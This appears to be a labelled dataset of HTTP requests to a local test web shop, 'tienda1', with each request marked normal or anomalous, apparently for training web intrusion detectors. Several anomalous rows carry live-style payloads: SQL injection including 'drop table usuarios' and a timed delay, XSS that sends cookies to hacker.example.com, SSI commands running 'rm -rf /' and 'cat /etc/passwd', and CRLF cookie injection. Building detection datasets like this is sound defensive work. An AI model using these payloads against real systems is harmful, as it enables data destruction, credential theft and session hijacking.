"localhost : 8080 / tienda1 / miembros / editar . jspmodo = registro & login = fouad5 & password = ganchuda & nombre = gabriel & apellidos = igartua & email = wordsworth @ pecher . rw & dni = 03775647j & direccion = pasaje + marques + de + santillana ,  + 29 +  & ciudad = castillonroy & cp = 22282 & provincia = valencia & ntc = 1607543227842772 & b1 = registrar",0
localhost : 8080 / tienda1 / publico / autenticar . jsp ? modo = entrar & login = sherri & pwd = ajote & remember = on /  & b1 = entrar,1
localhost : 8080 / tienda1 / publico / autenticar . jspmodoa = entrar & login = dokken8 & pwd = parlanchín & remember = off & b1 = entrar,1
localhost : 8080 / tienda1 / publico / anadir . jspid = 3 & nombre = queso + manchego & precio = 85 & cantidad = 95 & b1 = añadir + al + carrito,0
"localhost : 8080 / tienda1 / miembros / editar . jspmodo = registro & login = nitin & password = r4mitir & nombre = lionel & apellidos = nume / ros +  * mayo _ ral & email = creach @ vindexexpo . gr & dni = 37118814b & direccion = c /  + joaquin + arjona + 70 ,  +  & ciudad = rionegro + del + puente & cp = 49639 & provincia = barcelona & ntc = 8651464575981410 & b1 = registrar",1
localhost : 8080 / tienda1 / publico / autenticar . jspmodo = entrar & login = mobley & pwd = r10bo9b7 & remember = on & b1a = entrar,1
"localhost : 8080 / tienda1 / miembros / editar . jspmodo = registro & login = radick & password = aleve & nombre = parís & apellidos = roth * ermel + san + segundo & email = cawdon @ programaciones . com . gg & dni = 41955080k & direccion = c /  + san + jose + 121 ,  + 11 ? d & ciudad = holguera & cp = 43894 & provincia = granada & ntc = 8674124405846467 & b1 = registrar",1
"localhost : 8080 / tienda1 / publico / autenticar . jspmodo = entrar & login =  ""  + and +  "" 1 ""  =  "" 1 & pwd = 7u63ira681 & remember = on & b1 = entrar",1
"localhost : 8080 / tienda1 / miembros / editar . jspmodo = registro & login = jodee56 & password = homógra * fo & nombre = mardo & apellidos = cascárriez + valldeperas & email = mcdougal @ fichajes . nom . yu & dni = 98051441a & direccion = cisneros ,  + s / n +  & ciudad = pelahustán & cp = 46870 & provincia = teruel & ntc = 3742387438477895 & b1 = registrar",0
localhost : 8080 / tienda1 / miembros / editar . jsp ? modo = registro & login = sue - joe & password = ma460pla & nombre = samira & apellidos = de + la + cárcel + bascomta & email = wenham3 @ drivinn . tr & dni = 52820767w & direccion = calle + tenerias + 159 +  & ciudad = vilanova + de + l ' aguda & cp = 16373 & provincia = segovia & ntc = 4797226052502637 & b1 = registrar,0
"localhost : 8080 / tienda1 / miembros / editar . jsp ? modo = registro & login = wee - thon & password = 4asi258 & nombre = habib & apellidos = yebra + lores & email = shimada @ filtroselectroestaticos . es & dni = 50020791t & direccion = c /  + mar + caspio ,  + 187 + 9 - f & ciudad = baliarrain & cp = 50470 & provincia = soria & ntc = 0004533796646501 & b1 = registrar",0
"localhost : 8080 / tienda1 / miembros / editar . jspmodo = registro & login = youngman & password = a018699t0do & nombre = ibar & apellidos = baldí + almansa & emaila = damboise @ automovilesalhambra . co & dni = 44906096e & direccion = calle + lima ,  + 50 + 9 - d & ciudad = catadau & cp = 42066 & provincia = madrid & ntc = 0908077134973737 & b1 = registrar",1
localhost : 8080 / tienda1 / publico / pagar . jsp ? modo = insertar & precio = 2549 & b1 = confirmar,0
localhost : 8080 / tienda1 / miembros / editar . jsp ? modo = registro & login = yuyi & password = rámneo & nombre = bernardo & apellidos = uterga + sort & email = monti @ asyra . mu & dni = 97887901q & direccion = av .  + juan + de + austria + 143 + 3 ? d & ciudad = huerta + del + marquesado & cp = 46172 & provincia = lleida & ntc = 6202971897742782 & b1 = registrar,0
"localhost : 8080 / tienda1 / miembros / editar . jspmodo = registro & login = thyagara & password = fuerte & nombre = sol & apellidos = gorgone + oteo & email = tissier @ b - sign . cg & dni = 03028605b & direccion = calle + alboran + 39 ,  +  & ciudad = millanes & cp = 49731 & provincia = tarragona & ntc = 4096797311989091sessionid = 12312312 &  + username =  < script > document . location =  ' http :  /  / hacker +  . example . com / cgi - bin / cookiesteal . cgi ?  '  +  + document . cookie <  / script >  & b1 = registrar",1
localhost : 8080 / tienda1 / publico / pagar . jspmodo = insertar & precio = 1980 & b1 = confirmar / ,1
"localhost : 8080 / tienda1 / publico / registro . jsp ? modo = registro & login = crafton & password = p2 _ l5ote & nombre = peregrina & apellidos = mengual + bartumeu & email = feliciano @ atorre . mobi & dni = 80328105f & direccion = calle + zurbaran ,  + 131 ,  +  & ciudad =  '  ,  ' 0 '  ,  ' 0 '  )  ; waitfor + delay +  ' 0 : 0 : 15 '  ;  -  -  & cp = 48195 & provincia = sevilla & ntc = 4168827609798795 & b1 = registrar",1
localhost : 8080 / tienda1 / publico / anadir . jspid = 3 & nombrea = vino + rioja & precio = 39 & cantidad = 3 & b1 = añadir + al + carrito,1
localhost : 8080 / tienda1 / publico / pagar . jspmodo = insertar & precio = 6536 & b1 = confirmar / ,1
"localhost : 8080 / tienda1 / publico / pagar . jspmodo = insertar & precio =  ""  + and +  "" 1 ""  =  "" 1 & b1 = pasar + por + caja",1
localhost : 8080 / tienda1 / publico / pagar . jspmodo = insertar & precio = 8726 & b1 = confirmar,0
localhost : 8080 / tienda1 / publico / autenticar . jspmodo = entrar & login = larsen & pwd = fabada & remember = off & b1 = entrar,0
"localhost : 8080 / tienda1 / publico / anadir . jspid =  < ! -  -  # exec + cmd =  "" rm +  - rf +  /  ; cat +  / etc / passwd ""  +  -  -  >  & nombre = vino + rioja & precio = 39 & cantidad = 2 & b1 = añadir + al + carrito",1
localhost : 8080 / tienda1 / publico / autenticar . jspmodo = entrar & login = yuhjiun & pwd = remo7lero & remember = on & b1 = entrar,0
localhost : 8080 / tienda1 / publico / pagar . jspmodo = insertar & precio = 639 & b1 = pasar + por + caja,0
localhost : 8080 / tienda1 / publico / anadir . jsp ? ida = 2 & nombre = jamón + ibérico & precio = 85 & cantidad = 14 & b1 = añadir + al + carrito,1
localhost : 8080 / tienda1 / miembros / editar . jsp ? modo = registro & login = carli8 & password = 5im2n507 & nombre = josé + maría & apellidos = vilageli + bonet & email = baylor @ magichobby . sy & dni = 80135662m & direccion = calle + estrella + orion + 190 +  & ciudad = encinillas & cpa = 09681 & provincia = zaragoza & ntc = 2558545383527310 & b1 = registrar,1
localhost : 8080 / tienda1 / publico / autenticar . jspmodo = entrar & login = ranbir & pwd = salífero & remember = on /  & b1 = entrar,1
"localhost : 8080 / tienda1 / miembros / editar . jspmodo = registro & login = kingston & password = trasplante & nombre = johana & apellidos =  ""  >  < ! -  -  # exec + cmd =  "" dir +  ""  -  -  >  <  & email = lobe - cary @ videoerotic . mh & dni = 86807165j & direccion = calle + olof + palme + s / n ,  +  & ciudad = navezuelas & cp = 44330 & provincia = navarra & ntc = 4852910314860020 & b1 = registrar",1
localhost : 8080 / tienda1 / publico / autenticar . jspmodo = entrar & login = bonnevil & pwd = tao4smo & remember = on & b1 = entrar,0
"localhost : 8080 / tienda1 / miembros / editar . jsp ? modo = registro & login = schenck6 & password = velocípedo & nombre = rangle & apellidos = santalo + gabas & email = gelman _ fildes @ qcole . et & dni = 20787549b & direccion = est + udiant + es +  + 100 ,  +  & ciudad = maracena & cp = 16855 & provincia = toledo & ntc = 1669337364255501 & b1 = registrar",1
localhost : 8080 / tienda1 / publico / autenticar . jspmodo = entrar & login = anthea & pwd = horrís _ ono & remember = on /  & b1 = entrar,1
localhost : 8080 / tienda1 / publico / pagar . jsp ? modo = insertar & precio = 6159 & b1 = pasar + por + caja,0
localhost : 8080 / tienda1 / publico / anadir . jsp ? id = 2 & nombre = queso + manchego & precio = 100 & cantidad = 43 & b1 = añadir + al + carrito,0
"localhost : 8080 / tienda1 / miembros / editar . jsp ? modo = registro & login = morgan - c & password = ventera % 7c & nombre = abdel & apellidos = gortari & email = ericsson @ lalectura . gr & dni = 93062910b & direccion = c /  + barlovento ,  + 111 ,  + 5 ? h & ciudad = amurrio & cp = 25289 & provincia = guipúzcoa & ntc = 8608089924764976 & b1 = registrar",1
"localhost : 8080 / tienda1 / miembros / editar . jsp ? modo = registro & login = qinghui & password = disterminar & nombre = nadra & apellidos = busquets + baduell & email = lillo _ funk @ inoxled . ma & dni = 22652909w & direccion = c /  + codigo + correspondencia + oficial + correos - telegrafos ,  + 42 + 13 - b & ciudad = peralta + de + alcofea & cp = 47814 & provincia = v + iz + caya & ntc = 5583449016514744 & b1 = registrar",1
localhost : 8080 / tienda1 / publico / autenticar . jspmodoa = entrar & login = moyna & pwd = reparación & remember = off & b1 = entrar,1
"localhost : 8080 / tienda1 / miembros / editar . jsp ? modo = registro & login = macmulli6 & password = e676i9t2r & nombre = faustino & apellidos = torrus + gozzer & email = dina @ cementoscalibra . py & dni = 07434331h & direccion = c /  + comunidad + de + la + rioja ,  + 95 +  & ciudad = pino + del + oro & cp = 49580 & provincia = cáceres & ntc = 1910117961553498 & b1 = registrar",0
"localhost : 8080 / tienda1 / publico / registro . jspmodo = registro & login = messier & password = c7b183o & nombrea = nicodemo & apellidos = triola + villuend & email = galloway @ rtce . gu & dni = 35507822p & direccion = numero + 15 ,  + 151 ,  +  & ciudad = castrillo + de + la + guareña & cp = 23657 & provincia = toledo & ntc = 1278501676319264 & b1 = registrar",1
"localhost : 8080 / tienda1 / miembros / editar . jspmodo = registro & login = raglin & password = m783a1er3 & nombre = careli & apellidos = navines & email = leclerc6 @ soycastellano . gl & dni = 52316705p '  ;  + drop + table + usuarios ;  + select +  *  + from + datos + where + nombre + like +  '  %  & direccion = c /  + tavernes + blanques ,  + s / n +  & ciudad = rupià & cp = 21610 & provincia = guipúzcoa & ntc = 8201185179055303 & b1 = registrar",1
"localhost : 8080 / tienda1 / miembros / editar . jsp ? modo = registro & login = chapdela & password = sacar * ificación & nombre = gali & apellidos = piñeriro + celayes & email = macgowan @ comerciosdeaspe . kr & dni = 47913001e & direccion = c /  + virgen + de + la + esperanza + s / n ,  + 9 - b & ciudad = espadilla & cp = 1664a & provincia = ciudad + real & ntc = 8410049060666952 & b1 = registrar",1
localhost : 8080 / tienda1 / miembros / editar . jsp ? modo = registro & login = marconi1 & password = adularia & nombre = venancio % 2b & apellidos = del + campillo + aranda & email = blier @ ropadegolf . com . at & dni = 70108873c & direccion = paratge + pla + 18 + 8 ? d & ciudad = sotorribas & cp = 15391 & provincia = soria & ntc = 6078216616409598 & b1 = registrar,1
localhost : 8080 / tienda1 / publico / pagar . jsp ? modoa = insertar & precio = 3748 & b1 = pasar + por + caja,1
localhost : 8080 / tienda1 / publico / anadir . jspid = 1 & nombre = queso + manchego & precio = 39 & cantidad = 59 & b1a = añadir + al + carrito,1
"localhost : 8080 / tienda1 / miembros / editar . jspmodo = registro & login = jantz - le & password = antipatriótica & nombre = antonio & apellidos = aoyama & email = gurry - fujiki @ farmaoferta . cl & dni = 19546963e & direccion = c /  + gervasio + manrique + de + lara + 32 ,  + 6 ? b & ciudad = fresnillo + de + las + dueñas & cp = 46295 & provincia = cáceres & ntc = 5517817900139289 & b1 = registrar",0
"localhost : 8080 / tienda1 / miembros / editar . jsp ? modo = registro & login = de _ vries & password = tije7il07 & nombre = temistocles & apellidos = pinell + solivellas & email = wells @ softstylestudio . pro & dni = 97732616g & direccion = calle + playa + de + la + caleta ,  + 57 ,  +  & ciudad = cabezón + de + la + sierra & cp = 25700 & provincia = girona & ntc = 2965085022683319 & b1 = registrar",0
"localhost : 8080 / tienda1 / publico / registro . jsp ? modo = registro & login = cash3 & password = urpila & nombre = jeanne & apellidosa = sandrini + rotllant & email = olmer @ matchball . com . im & dni = 52809393j & direccion = plaça + de + can + galta + cremat ,  + 111 +  & ciudad = navia & cp = 37447 & provincia = cádiz & ntc = 1124103686450000 & b1 = registrar",1
localhost : 8080 / tienda1 / publico / caracteristicas . jsp ? id =  + ,1
"localhost : 8080 / tienda1 / publico / registro . jsp ? modo = registro & login = mutsuo & password = 4ar763m93 & nombre = alejandrina & apellidos = bordas + rubies & email = kongcharoen - aidman @ mailboxrussia . li & dni = 20464046a & direccion = carretera + a + la + albericia + y + monte + 42 ,  +  & ciudad = belmonte & cp = 37752 & provincia = la + rioja & ntc = 9422906866831681 & b1 = registrar",0
localhost : 8080 / tienda1 / publico / autenticar . jspmodo = entrar & login = marcello87 & pwd = mongolism _ o & remember = off & b1 = entrar,0
localhost : 8080 / tienda1 / publico / autenticar . jsp ? modo =  +  & login = anoop & pwd = 767ífic6 & remember = off & b1 = entrar,1
"localhost : 8080 / tienda1 / miembros / editar . jspmodo = registro & login = z * iqia ,  * ng & password = sintética & nombre = deodato & apellidos = chen + baliña & email = chalon @ ingenelec . gl & dni = 00776957v & direccion = calle + la + bañeza + 52 +  & ciudad = remolinos & cp = 18570 & provincia = castellón & ntc = 7967285688712382 & b1 = registrar",1
"localhost : 8080 / tienda1 / publico / registro . jspmodo = registro & login = sobel & password = tablazón & nombre = alexia & apellidos = fuguera + mock & email = knorr . desjardin @ movilgoogle . bw & dni = 96579653p & direccion = grupo + santo + domingo ,  + 88 + 8 ? f & ciudad = ataun & cp = 12428 & provincia = teruel & ntc = 6222371193056945 & b1 = registrar",0
"localhost : 8080 / tienda1 / miembros / editar . jspmodo = registro & login =  ' or ' a =  ' a & password = 7u3eo & nombre = marcelino & apellidos = gispert & email = moriaty . suchima @ vendomiatico . at & dni = 76973319r & direccion = carrer + puigterra + de + dalt ,  + 69 ,  +  & ciudad = alcalá + del + júcar & cp = 34477 & provincia = girona & ntc = 5196721943648454 & b1 = registrar",1
"localhost : 8080 / tienda1 / publico / registro . jspmodo = any % 0aset - cookie % 3a + tamper % 3d1041264011025374727 & login = sienggo & password = 6121cu5gé * 7449 & nombre = jerónimo & apellidos = carretto + morgadas & email = magelis . kember @ cirujanaplastica . nc & dni = 22646510c & direccion = plaza + san + jorge ,  + s / n ,  + 2 ? h & ciudad = mariana & cp = 15807 & provincia = palencia & ntc = 2175163155221209 & b1 = registrar",1
localhost : 8080 / tienda1 / publico / registro . jsp ? modo = registro & login = jiann & password = freno & nombre = raifroid & apellidos = solá + portillo & email = nererova @ camilafansite . by & dni = 41955080k & direccion = c /  + fusta + 40 + 11 - f & ciudad = san + pablo + de + los + montes & cp = 49333 & provincia = burgos & ntc =  @ 40 & b1 = registrar,1
localhost : 8080 / tienda1 / publico / caracteristicas . jsp ? id = paros % 22 + style % 3d % 22background % 3aurl % 28javascript % 3aalert % 28 % 27paros % 27 % 29 % 29 & id = 2,1
localhost : 8080 / tienda1 / publico / pagar . jsp ? modo = insertar & precio = 3180 & b1 = pasar + por + caja,0
localhost : 8080 / tienda1 / publico / anadir . jspid = 3 & nombre = jamón + ibérico & precio =  ' injected _ param & cantidad = 90 & b1 = añadir + al + carrito,1
"localhost : 8080 / tienda1 / miembros / editar . jspmodo = registro & login = kamran & password = fic25 & nombre = guillermo & apellidos = la + casa + baumgartner & email = gjezi _ anselmi @ simulacion - credito . ba & dni = 83368032r & direccion = c /  + nueva + imagen ,  + 180 ,  +  & ciudad = bodón ,  + el & cp = 44114 & provincia = almería & ntc = 7665938567309888 & b1 = registrar",0
"localhost : 8080 / tienda1 / miembros / editar . jsp ? modo = registro & login = zug & password = compatible & nombre = casia & apellidos = rocha + pello & email = swangrat5 @ beautifulbody . im & dni = 58105650z & direccion = calle + santa + clara + 34 ,  + 6 - e & ciudad = carballiño ,  + o & cp = 34406 & provincia = salamanca & ntc = 1214067410699386 & b1 = registrar",0
localhost : 8080 / tienda1 / publico / caracteristicas . jsp / asf - logo - wide,1
localhost : 8080 / tienda1 / publico / pagar . jspmodo = insertar & precio = 8361 & b1 = confirmar,0
"localhost : 8080 / tienda1 / miembros / editar . jsp ? modoa = registro & login = bernarr & password = gordana & nombre = uriel & apellidos = cloquell + pesarrodona & email = moorehead - hamlett @ touringa . pw & dni = 64688843d & direccion = pl .  + la + merced ,  + 107 + 4c & ciudad = cuarte + de + huerva & cp = 19420 & provincia = teruel & ntc = 4593991243170323 & b1 = registrar",1
"localhost : 8080 / tienda1 / miembros / editar . jspmodo = registro & login = events & password = 0s471ma & nombre = petronila & apellidos = rabell & email = bernardi @ elsentidodelavida . eu & dni = 15513258b & direccion = calle + futbol + 61 ,  + 5 ? a & ciudad = valeras ,  + las & cp = 03610 & provincia = salamanca & ntc = 7162914208436740 & b1 = registrar",0
"localhost : 8080 / tienda1 / publico / registro . jspmodo = registro & login = chun & password = muti35o & nombre = ralston & apellidos = jérica + funosa & email = mineau - bear @ guiapolicial . mx & dni = 90125861q & direccion = c /  + juan + butragueño ,  + 92 + 9 ? d & ciudad = castilfrío + de + la + sierra & cp = 41566 & provincia = guadalajara & ntc = 818155596340043 & b1 = registrar",1
"localhost : 8080 / tienda1 / publico / anadir . jsp ? id = 3 & nombre = queso + manchego & precio = 39 & cantidad = 28 & b1 =  < ! -  -  # exec + cmd =  "" rm +  - rf +  /  ; cat +  / etc / passwd ""  +  -  -  > ",1
localhost : 8080 / tienda1 / publico / pagar . jspmodo = insertar & precio = 7391 & b1 = confirmar / ,1
localhost : 8080 / tienda1 / publico / anadir . jspid = 1 & nombre = queso + manchego & precio = 100 & cantidad = 68 & b1 = añadir + al + carrito,0
localhost : 8080 / tienda1 / publico / autenticar . jspmodo = entrar & login = voelcker & pwd = cometario & remember = off & b1 = entrar,0
localhost : 8080 / tienda1 / publico / pagar . jspmodo = insertar & precio = 2381 & b1 = pasar + por + caja,0
localhost : 8080 / tienda1 / publico / anadir . jsp ? id = 2 & nombre = queso + manchego & precio = 100 & cantidad = 66 & b1 = añadir + al + carrito,0
"localhost : 8080 / tienda1 / miembros / editar . jsp ? modo = registro & login = kizzee & password = malojal & nombre = remigio & apellidos = lizama + vielmas & email = lundy @ academiaversal . pm & dni = 90471972t & direccion = c /  + prado ,  + 132 +  & ciudad = dos + hermanas & cp = 48192 & provincia = cuenca & ntc = 1286497435313401 & b1 = registrar",0
localhost : 8080 / tienda1 / publico / autenticar . jspmodo = entrar & login = leigh & pwd = 2a045t8 & remember = on & b1 = entrar,0
localhost : 8080 / tienda1 / publico / autenticar . jsp ? modo = entrar & login = he ?  ' hn +  - sch & pwd = 4n013mo4i2 & remember = on & b1 = entrar,1
localhost : 8080 / samples / sampsite / about . htm,1
"localhost : 8080 / tienda1 / miembros / editar . jspmodo = registro & login = kacy & password = en4ocar & nombre = policarpo & apellidos = d ' pao _ li & email = weismuller @ e - b - s . kr & dni = 77550396p & direccion = avinguda + biscaia ,  + 98 + 13 - g & ciudad = villares + del + saz & cp = 05514 & provincia = segovia & ntc = 9931554844705461 & b1 = registrar",1
"localhost : 8080 / tienda1 / miembros / editar . jspmodo = registro & login = lorrayne & password = anofele6 & nombre = neliana & apellidos = monllor + mascort & email = tsaganeas @ mccomptables . my & dni = 26431261y & direccion = calle + begonia + 47 ,  +  & ciudad = recuenco ,  + el & cp = 44168 & provincia = salamanca & ntc = 7168408229054610paros % 22 + style % 3d % 22background % 3aurl % 28javascript % 3aalert % 28 % 27paros % 27 % 29 % 29 & id = 2 & b1 = registrar",1
localhost : 8080 / tienda1 / miembros / 6909030637832563290 . jsp,1
"localhost : 8080 / tienda1 / miembros / editar . jsp ? modo = registro & login = melton & password = 09scab8715rs7 & nombre = aimé & apellidos = fidelibus + migliorino & email = cort @ miplat . tc & dni = 37552053e & direccion = carrer + lola + anglada ,  + 32 +  & ciudad = aretxabaleta & cp = 48288 & provincia = albacete & ntc = 9436453086573227 & b1 = registrar",0
"localhost : 8080 / tienda1 / publico / registro . jsp ? modo = registro & login = pezzullo & password = 3s3lavo3ía & nombre = cipriana & apellidos = maza + de + lizana + busqueta & email = verstraete2 @ soyouthinkyoucandance . io & dni = 86251880v & direccion = calle + nuria ,  + 8 ,  +  & ciudad = castrillo - tejeriego & cp = 0913a & provincia = toledo & ntc = 7846720837144073 & b1 = registrar",1
"localhost : 8080 / tienda1 / publico / registro . jsp ? modo = registro & login = daffi & password = t46sur3 & nombre = simeón & apellidos = frances + tapias & email = debucourt @ campodegolf . com . ge & dni = 43368920m & direccion = plza .  + boston + 87 ,  + 10f & ciudad = valle + de + losa & cp = 36450 & provincia = león & ntc = 8346016668545574 & b1 = registrar",0
"localhost : 8080 / tienda1 / miembros / editar . jsp ? modo = registro & login = felicity & password = bo9510c8951vo & nombre = deodato & apellidos = treig + bonitto & email = roo @ didacramirez . kn & dni = 42952758m & direccion = lora + 64 ,  +  & ciudad = villanueva + de + teba & cpa = 43884 & provincia = valladolid & ntc = 8769540261854446 & b1 = registrar",1
localhost : 8080 / tienda1 / publico / anadir . jsp ? id = 2 & nombre = queso + manchego & precio =  % 2b & cantidad = 98 & b1 = añadir + al + carrito,1
localhost : 8080 / tienda1 / publico / autenticar . jspmodo = entrar & login = zolly & pwd = i - nsípido & remember = off & b1 = entrar,0
localhost : 8080 / tienda1 / publico / pagar . jspmodo = insertar & precio = 9801 & b1 = any % 3f % 0aset - cookie % 3a + tamper % 3d5765205567234876235,1
localhost : 8080 / tienda1 / publico / anadir . jspid = 1 & nombre = vino + rioja & precio = 39 & cantidad = 63 & b1 = añadir + al + carrito,0
"localhost : 8080 / tienda1 / miembros / editar . jspmodo = registro & login = vinet '  ;  + drop + table + usuarios ;  + select +  *  + from + datos + where + nombre + like +  '  %  & password = rel + atoría & nombre = ihor & apellidos = bedos & email = sangareau @ faders . com . mil & dni = 74830064r & direccion = santa + agueda ,  + s / n + 5 ? g & ciudad = zarza + de + montánchez & cp = 28191 & provincia = jaén & ntc = 9112082229252110 & b1 = registrar",1
localhost : 8080 / tienda1 / publico / autenticar . jsp ? modo = entrar & login = kameko & pwd = 08acar & remember = off & b1 = entrar,0
localhost : 8080 / tienda1 / publico / pagar . jspmodo = insertar & precio = 6915 & b1 = pasar + por + caja,0
localhost : 8080 / tienda1 / publico / anadir . jspid = 2 & nombre = jamón + ibérico & precio = 85any % 3f % 0aset - cookie % 3a + tamper % 3d5765205567234876235 & cantidad = 23 & b1 = añadir + al + carrito,1
localhost : 8080 / tienda1 / publico / autenticar . jsp ? modo =  % 7c & login = mcnally & pwd = lactescente & remember = on & b1 = entrar,1
localhost : 8080 / tienda1 / publico / registro . jspmodo = registro & login = tak & password = ro1ánica & nombre = raffaello & apellidos = obiols + fontte & email = khorsand @ nexuspark . ye & dni = 97774061a & direccion = c /  + moctezuma + 35 +  & ciudad = san + felices + de + los + gallegos & cp = 43773 & provincia = sevilla & ntc = 5505928898200135 & b1 = registrar,0
"localhost : 8080 / tienda1 / miembros / editar . jsp ? modo = registro & login = anallese & password = tortosina & nombre = leonídas & apellidos = solá + portillo & email = beckha @ us @  @ asociaciondearquite @ ctoslatinoamericanos . fo & dni = 92727720t & direccion = jose + maria + pereda ,  + 185 ,  +  & ciudad = ucero & cp = 09047 & provincia = valencia & ntc = 6368947017826630 & b1 = registrar",1
localhost : 8080 / tienda1 / publico / pagar . jspmodo = insertar & precio =  ?  & b1 = confirmar,1
"localhost : 8080 / tienda1 / publico / registro . jsp ? modo = registro & logina = santiago & password = as6m1r & nombre = dámaso & apellidos = basas + soto & email = alejandro - kurgic @ repretexbcn . cy & dni = 69198356g & direccion = av .  + valdecilla ,  + s / n + 10 - b & ciudad = robladillo & cp = 31520 & provincia = la + rioja & ntc = 7775887552046645 & b1 = registrar",1
"localhost : 8080 / tienda1 / publico / anadir . jspid =  < ! -  -  # exec + cmd =  "" ls +  /  ""  -  -  >  & nombre = jamón + ibérico & precio = 100 & cantidad = 48 & b1 = añadir + al + carrito",1
localhost : 8080 / tienda1 / publico / autenticar . jsp ? modo = entrar & login = libbey & pwd = 141c1u01 & remember = on & b1a = entrar,1
localhost : 8080 / tienda1 / publico / anadir . jspid = 1 /  & nombre = jamón + ibérico & precio = 85 & cantidad = 25 & b1 = añadir + al + carrito,1
"localhost : 8080 / tienda1 / publico / registro . jspmodo = registro & logina = logntp & password = restitutorio & nombre = huillimanque & apellidos = cure + lozana & email = nathenson1 @ sandrasummer . sy & dni = 47051425a & direccion = c /  + lebrillo ,  + 155 ,  + 4 - a & ciudad = olmedo + de + camaces & cp = 44589 & provincia = valladolid & ntc = 6933033673510667 & b1 = registrar",1
"localhost : 8080 / tienda1 / miembros / editar . jspmodo = registro & login = max & password = susan & nombre = lucinio & apellidos = ponseti + vilarrasa & email = oudrey @ 3horas . bg & dni = 21264850q & direccion = calle + yuca + 151 ,  + 9 ? h & ciudad = castro - urdiales & cp = 09108 & provincia = badajoz & ntc = 2726481984046750 & b1 = registrar",0
"localhost : 8080 / tienda1 / miembros / editar . jspmodo = registro & login = marasliy & password = 2org4 & nombre = mailén & apellidos = aleu + alcaide & email = laurie @ martosfutbolsala . gm & dni = 18455622p & direccion = calle + antolin + garcia ,  + s / n +  & ciudad = casasola & cp = 04810 & provincia = barcelona & ntc = 6739508429793646 & b1 = registrar",0
localhost : 8080 / tienda1 / publico / anadir . jsp ? id =  ?  & nombre = queso + manchego & precio = 100 & cantidad = 48 & b1 = añadir + al + carrito,1
"localhost : 8080 / tienda1 / miembros / editar . jsp ? modo = registro & login = ottoman & password = calabrotar & nombre = lope & apellidos = reynaldo & email = balieff @ hotelesymas . cs & dni = 56187478l & direccion = calle + muelle + de + oriente + 97 ,  + 9 ? h & ciudad = esgos & cp = 44587 & provincia = lleida & ntc = 6503875541116739 & b1 = registrar",0
